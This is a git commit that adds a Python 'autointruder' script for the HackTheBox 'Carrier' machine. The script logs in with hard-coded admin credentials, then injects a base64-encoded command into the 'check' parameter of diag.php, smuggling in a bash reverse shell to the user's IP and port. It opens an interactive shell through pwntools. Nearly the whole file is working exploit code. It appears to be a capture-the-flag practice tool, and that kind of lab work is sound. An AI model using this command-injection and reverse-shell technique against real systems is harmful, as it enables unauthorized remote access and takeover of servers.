23aec4e918f32d9976ddaae3a1ada8d7c1801f64
kerjag25 <92223496+kerjag25@users.noreply.github.com>
2022-01-06 20:27:25 -0600

    Add files via upload

---
+++ Carrier.py
@@ -0,0 +1,105 @@
+
+import requests
+import base64
+import time
+
+print("""
+ _             _             ___  _____ 
+| |           (_)           |__ \| ____|""")
+time.sleep(0.1)
+print("| | _____ _ __ _  __ _  __ _   ) | |__  ")
+time.sleep(0.1)
+print("| |/ / _ \ '__| |/ _` |/ _` | / /|___ \ ")
+time.sleep(0.1)
+print("|   <  __/ |  | | (_| | (_| |/ /_ ___) |")
+time.sleep(0.1)
+print("|_|\_\___|_|  | |\__,_|\__, |____|____/ ")
+time.sleep(0.1)
+print("             _/ |       __/ |           ")
+time.sleep(0.1)
+print("            |__/       |___/       ")
+time.sleep(0.1)
+print('KERJAG25 - CARRIER HACKTHEBOX AUTOINTRUDER\n')
+
+ip = input('Introduce tu IP (tun0): ')
+port = int(input('Puerto con el que quieras romper la mamona\n\n[!]IMPORTANTE\nSi el puerto que quieres está por debajo del 1024 requeriras ejecutar este script como root\nrecomiendo un puerto superior al 1024\n\nIntroduce tu puerto: '))
+
+from pwn import *
+
+def def_handler(sig, frame):
+    print('[-]Exit')
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+def ping(host):
+    response = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
+    if response == 0:
+        return True
+
+    else:
+        return False
+
+if ping('10.10.10.105') == False:
+    print('[-]Conexión con la máquina fallida')
+    time.sleep(0.5)
+    print('[-]La máquina está activa?')
+    time.sleep(0.5)
+    print('[-]Intenta ejecutar el script de nuevo')
+    sys.exit(1)
+
+
+if ping('10.10.10.105') == True:
+    time.sleep(0.1)
+    print('[+]Conexión Exitosa')
+    url = requests.get('http://10.10.10.105')
+    
+    if url.status_code == 200:
+        time.sleep(0.5)
+        print(f'[+]HTTP/{url.status_code} OK')
+        time.sleep(0.5)
+        print('[+]Logueandose')
+        logurl = "http://10.10.10.105"
+        c = requests.session()
+        AuthData = {'username' : 'admin', 'password' : 'NET_45JDX23'}
+        r = c.post(logurl, data=AuthData)
+        
+        if "Dashboard" in r.text:
+            time.sleep(0.5)
+            print('[+]Inyectando comando...')
+            
+            def test():
+                print('[+]Conectando...')
+                message = f'; /bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
+                message_bytes = message.encode('ascii')
+                base64_bytes = base64.b64encode(message_bytes)
+                base64_message = base64_bytes.decode('ascii')
+                codeurl = "http://10.10.10.105/diag.php"
+                datacode = {'check' : base64_message}
+                c.post(codeurl, data=datacode)
+        
+            try:                
+                threading.Thread(target=test).start()
+
+            except Exception as e:
+                print(f'[-]{e}')                       
+
+            shellc = listen(port, timeout=5).wait_for_connection()
+
+            if shellc.sock is None:
+                print('[-]Conexión fallida')
+                sys.exit(1)
+
+            else:
+                time.sleep(0.5)
+                print('[+]Inyección de comandos exitosa')
+            shellc.interactive()
+        
+        else:
+            print('[-]Algo salió mal logueandose')
+            sys.exit(1)
+    else:
+        print(f'[-]Algo salió mal')
+        time.sleep(0.5)
+        print(f'[-]HTTP/{url.status_code}')
+        sys.exit(1)
